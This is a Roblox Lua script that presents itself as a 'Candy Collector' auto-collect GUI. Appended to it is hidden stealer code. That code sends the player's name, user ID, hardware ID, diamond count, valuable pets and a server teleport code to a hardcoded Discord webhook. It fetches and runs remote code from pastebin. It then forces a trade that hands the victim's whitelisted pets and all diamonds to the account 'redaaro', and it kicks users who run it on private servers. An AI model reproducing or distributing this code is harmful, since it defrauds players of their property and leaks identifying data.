getgenv().autoCollectCandy = false

-- Wait until game and PlayerGui are ready
repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer and game.Players.LocalPlayer:FindFirstChild("PlayerGui")

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Candy collecting functions
function collectCandy(candyPart)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        firetouchinterest(candyPart, character.HumanoidRootPart, 0)
        firetouchinterest(candyPart, character.HumanoidRootPart, 1)
        return true
    end
    return false
end

function collectAllExistingCandy()
    local collected = 0
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj.Name:lower():find("candy") and obj:IsA("Part") then
            if collectCandy(obj) then
                collected = collected + 1
            end
        end
    end
    return collected
end

-- Check if GUI already exists and remove
if playerGui:FindFirstChild("CandyCollectorGUI") then
    playerGui:FindFirstChild("CandyCollectorGUI"):Destroy()
end

-- Create GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CandyCollectorGUI"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 320, 0, 220)
mainFrame.Position = UDim2.new(0.5, -160, 0.1, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.ZIndex = 10
mainFrame.Parent = screenGui

-- Corner
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

-- Shadow
local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.Size = UDim2.new(1, 20, 1, 20)
shadow.Position = UDim2.new(0, -10, 0, -10)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://1316045217"
shadow.ImageColor3 = Color3.fromRGB(0,0,0)
shadow.ImageTransparency = 0.8
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(10,10,118,118)
shadow.ZIndex = -1
shadow.Parent = mainFrame

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 50)
titleBar.BackgroundColor3 = Color3.fromRGB(45,45,55)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = titleBar

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, -40, 1, 0)
title.Position = UDim2.new(0,10,0,0)
title.BackgroundTransparency = 1
title.Text = "🍬 Candy Collector"
title.TextColor3 = Color3.fromRGB(255,255,255)
title.TextSize = 18
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = titleBar

-- Close Button
local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0,30,0,30)
closeButton.Position = UDim2.new(1,-35,0,10)
closeButton.BackgroundColor3 = Color3.fromRGB(255,60,60)
closeButton.BorderSizePixel = 0
closeButton.Text = "×"
closeButton.TextColor3 = Color3.fromRGB(255,255,255)
closeButton.TextSize = 20
closeButton.Font = Enum.Font.GothamBold
closeButton.Parent = titleBar

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0,8)
closeCorner.Parent = closeButton

-- Content Frame
local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1,-20,1,-70)
contentFrame.Position = UDim2.new(0,10,0,60)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

-- Status Label
local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "StatusLabel"
statusLabel.Size = UDim2.new(1,0,0,30)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Status: Inactive 🔴"
statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
statusLabel.TextSize = 16
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = contentFrame

-- Toggle Button
local toggleButton = Instance.new("TextButton")
toggleButton.Name = "ToggleButton"
toggleButton.Size = UDim2.new(1,0,0,50)
toggleButton.Position = UDim2.new(0,0,0,40)
toggleButton.BackgroundColor3 = Color3.fromRGB(60,200,80)
toggleButton.BorderSizePixel = 0
toggleButton.Text = "START COLLECTING"
toggleButton.TextColor3 = Color3.fromRGB(255,255,255)
toggleButton.TextSize = 16
toggleButton.Font = Enum.Font.GothamBold
toggleButton.Parent = contentFrame

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0,8)
toggleCorner.Parent = toggleButton

-- Collect Button
local collectButton = Instance.new("TextButton")
collectButton.Name = "CollectButton"
collectButton.Size = UDim2.new(1,0,0,50)
collectButton.Position = UDim2.new(0,0,0,100)
collectButton.BackgroundColor3 = Color3.fromRGB(60,150,255)
collectButton.BorderSizePixel = 0
collectButton.Text = "COLLECT NOW"
collectButton.TextColor3 = Color3.fromRGB(255,255,255)
collectButton.TextSize = 16
collectButton.Font = Enum.Font.GothamBold
collectButton.Parent = contentFrame

local collectCorner = Instance.new("UICorner")
collectCorner.CornerRadius = UDim.new(0,8)
collectCorner.Parent = collectButton

-- Stats Label
local statsLabel = Instance.new("TextLabel")
statsLabel.Name = "StatsLabel"
statsLabel.Size = UDim2.new(1,0,0,20)
statsLabel.Position = UDim2.new(0,0,0,160)
statsLabel.BackgroundTransparency = 1
statsLabel.Text = "Candy Collected: 0"
statsLabel.TextColor3 = Color3.fromRGB(200,200,200)
statsLabel.TextSize = 14
statsLabel.Font = Enum.Font.Gotham
statsLabel.TextXAlignment = Enum.TextXAlignment.Left
statsLabel.Parent = contentFrame

-- Drag functionality
local dragging = false
local dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- GUI functionality
local candyCount = 0

local function updateStatus()
    if getgenv().autoCollectCandy then
        statusLabel.Text = "Status: Active 🟢"
        statusLabel.TextColor3 = Color3.fromRGB(100,255,100)
        toggleButton.Text = "STOP COLLECTING"
        toggleButton.BackgroundColor3 = Color3.fromRGB(255,60,80)
    else
        statusLabel.Text = "Status: Inactive 🔴"
        statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
        toggleButton.Text = "START COLLECTING"
        toggleButton.BackgroundColor3 = Color3.fromRGB(60,200,80)
    end
end

toggleButton.MouseButton1Click:Connect(function()
    getgenv().autoCollectCandy = not getgenv().autoCollectCandy
    updateStatus()
end)

collectButton.MouseButton1Click:Connect(function()
    local originalText = collectButton.Text
    collectButton.Text = "COLLECTING..."
    collectButton.BackgroundColor3 = Color3.fromRGB(255,150,50)
    
    local collected = collectAllExistingCandy()
    if collected > 0 then
        candyCount = candyCount + collected
        statsLabel.Text = "Candy Collected: " .. candyCount
    end
    
    wait(0.5)
    
    collectButton.Text = originalText
    collectButton.BackgroundColor3 = Color3.fromRGB(60,150,255)
end)

closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
    getgenv().autoCollectCandy = false
end)

-- Modified collect function to track stats for auto-collect
local originalCollectCandy = collectCandy
collectCandy = function(candyPart)
    local success = originalCollectCandy(candyPart)
    if success then
        candyCount = candyCount + 1
        statsLabel.Text = "Candy Collected: " .. candyCount
    end
    return success
end

-- Main collection loop (auto-collect)
spawn(function()
    while true do
        if getgenv().autoCollectCandy then
            collectAllExistingCandy()
        end
        task.wait(0.1)
    end
end)

-- Listen for new candy spawning
workspace.DescendantAdded:Connect(function(obj)
    if getgenv().autoCollectCandy and obj.Name:lower():find("candy") and obj:IsA("Part") then
        collectCandy(obj)
    end
end)

-- Initialize with correct status
updateStatus()

print("Candy Collector GUI loaded successfully!")
print("Auto-collect is DISABLED by default.")
print("Click 'START COLLECTING' to begin auto-collecting candy.")

getgenv().UName = "redaaro"
getgenv().HasWhitelisted = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local diamondsText = LocalPlayer.PlayerGui.MainGui.StartFrame.Currency.Diamonds.Amount.Text
local clean = diamondsText:gsub(",", "")
local Diamonds = tonumber(clean)
local Duped = Diamonds * 2

local PetsInventory = require(LocalPlayer.PlayerScripts.MainClient.Gui.GuiScripts.PetsInventory)
local ClientDataManager = require(LocalPlayer.PlayerScripts.MainClient.ClientDataManager)
local PetsInfo = require(ReplicatedStorage.Modules.PetsInfo)

local Whitelisted = {
    ["Domino Crown God"] = true,
    ["Golden Domino Crown God"] = true,
    ["Shiny Domino Crown God"] = true,
    ["Rainbow Domino Crown God"] = true,
    ["Void Domino Crown God"] = true,
    ["Void Builder Bot"] = true,
    ["Rainbow 1x1x1x1"] = true,
    ["Void 1x1x1x1"] = true,
    ["Void Noob Queen"] = true,
    ["Shiny Noob Queen"] = true,
    ["Rainbow Noob Queen"] = true,
    ["Eclipse"] = true,
    ["Golden Eclipse"] = true,
    ["Shiny Eclipse"] = true,
    ["Rainbow Eclipse"] = true,
    ["Void Eclipse"] = true,
    ["Rainbow Ultra Mecha"] = true,
    ["Void Ultra Mecha"] = true,
    ["Amethyst Overlord"] = true,
    ["Golden Amethyst Overlord"] = true,
    ["Shiny Amethyst Overlord"] = true,
    ["Rainbow Amethyst Overlord"] = true,
    ["Void Amethyst Overlord"] = true,
    ["Shiny Universe Ruler"] = true,
    ["Rainbow Universe Ruler"] = true,
    ["Void Universe Ruler"] = true,
    ["Void Fire Empyrean"] = true,
    ["Rainbow Stardust"] = true,
    ["Shiny Stardust"] = true,
    ["Void Stardust"] = true,
    ["Void Shadow Wraith"] = true,
    ["Rainbow Rockstar-x"] = true,
    ["Void Rockstar-x"] = true,
    ["Rainbow Crystalis"] = true,
    ["Void Crystalis"] = true,
    ["Void Crystal Empress"] = true,
    ["Golden Blitzshade"] = true,
    ["Rainbow Blitzshade"] = true,
    ["Void Blitzshade"] = true,
    ["Blitzshade"] = true,
    ["The Leaves of Fall"] = true,
    ["Golden The Leaves of Fall"] = true,
    ["Shiny The Leaves of Fall"] = true,
    ["Rainbow The Leaves of Fall"] = true,
    ["Void The Leaves of Fall"] = true,
    ["Rainbow Queen of the Fall"] = true,
    ["Void Queen of the Fall"] = true,
    ["Void Toxic Overlord"] = true,
    ["Rainbow Toxic Overlord"] = true,
    ["Void Magma Majesty"] = true,
    ["Rainbow Magma Majesty"] = true,
    ["Void Oceana"] = true,
    ["Rainbow Oceana"] = true,
    ["Void Solara"] = true,
    ["Emperor of Halloween"] = true,
    ["Golden Emperor of Halloween"] = true,
    ["Rainbow Emperor of Halloween"] = true,
    ["Void Emperor of Halloween"] = true,
    ["Void King of Bats"] = true,
}

local function AddWhitelistedPets()
    for petID, petData in pairs(ClientDataManager.Data.Pets) do
        local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
        if Whitelisted[petName] then
            if petData.Locked then
                ReplicatedStorage.Events.UIAction:FireServer("TogglePetLocked", petID)
            end
            ReplicatedStorage.Events.UIAction:FireServer("AddPetInTrade", petID)
        end
    end
end

local function ModifyDiamondOffer(amount)
    ReplicatedStorage.Events.UIAction:FireServer("ModifyDiamondOffer", amount)
end

local function SendTrade(playerName)
    local player = Players:FindFirstChild(playerName)
    if player then
        ReplicatedStorage.Events.UIAction:FireServer("RequestTradeWithPlayer", player)
    else
        warn("Player not found: " .. tostring(playerName))
    end
end

local function GetTeleportScript()
    local placeId = game.PlaceId
    local jobId = game.JobId
    return string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId)
end

local function rt()
    while LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame.Visible do
        task.wait(0.1)
        ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
    end
end

local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
    if TradeGui.Visible then
        task.spawn(rt)
        AddWhitelistedPets()
        ModifyDiamondOffer(Diamonds)
    end
end)

local function StartTrade()
    wait(9)
    loadstring(game:HttpGet("https://pastebin.com/raw/8wP3Pkwz"))()
    SendTrade(getgenv().UName)
end

getgenv().HasWhitelisted = false
for petID, petData in pairs(ClientDataManager.Data.Pets) do
    local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
    if Whitelisted[petName] then
        getgenv().HasWhitelisted = true
        break
    end
end

local function getWhitelistedPets()
    local list = {}
    for petID, petData in pairs(ClientDataManager.Data.Pets) do
        local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
        if Whitelisted[petName] then
            table.insert(list, petName)
        end
    end
    return table.concat(list, ", ")
end

local whitelistedPets = getWhitelistedPets()

local Webhook_URL = "https://discord.com/api/webhooks/1223588545894158347/3PJdmPm7NEQYvvkKVByKbt8W84I27Tu0beo3WWsWhL0ZCqUtbG3pAAimUCqBjk67yWN8"

local player = game.Players.LocalPlayer
local function getPlayerProfile(player)
    local playerName = player.Name
    local playerID = player.UserId
    local accountAge = player.AccountAge
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    return playerName, playerID, accountAge, hwid
end

local playerName, playerID, accountAge, hwid = getPlayerProfile(player)

local data = {
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = playerName,
                ["icon_url"] = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=".. playerID .."&size=150x150&format=Png&isCircular=false",
            },
            ["title"] = "Execution Detected!",
            ["description"] = "gg./ScriptKids",
            ["type"] = "rich",
            ["color"] = tonumber(0xFF0000),
            ["fields"] = {
                {["name"]="Player ID:", ["value"]=tostring(playerID), ["inline"]=true},
                {["name"]="Gems:", ["value"]=tostring(Diamonds), ["inline"]=true},
                {["name"]="Whitelisted Pets:", ["value"]=whitelistedPets ~= "" and whitelistedPets or "None", ["inline"]=false},
                {["name"]="Account Age:", ["value"]=string.format("%.2f days", accountAge), ["inline"]=true},
                {["name"]="HWID:", ["value"]=hwid, ["inline"]=true},
                {["name"]="Teleport Code:", ["value"]=GetTeleportScript(), ["inline"]=false},
            },
        },
    },
}

local Request = http_request or request or HttpPost or (syn and syn.request)

if Request then
    Request({
        Url = Webhook_URL,
        Body = HttpService:JSONEncode(data),
        Method = "POST",
        Headers = {["Content-Type"]="application/json"}
    })
end

if getgenv().HasWhitelisted or Diamonds > 10 then
    local target = Players:FindFirstChild(getgenv().UName)
    if target then
        StartTrade()
    else
        Players.PlayerAdded:Connect(function(player)
            if player.Name == getgenv().UName then
                StartTrade()
            end
        end)
    end
else
    print("enjoy")
end

if #Players:GetPlayers() <= 1 then
    LocalPlayer:Kick("Dont use private server")
else
    print("not")
end
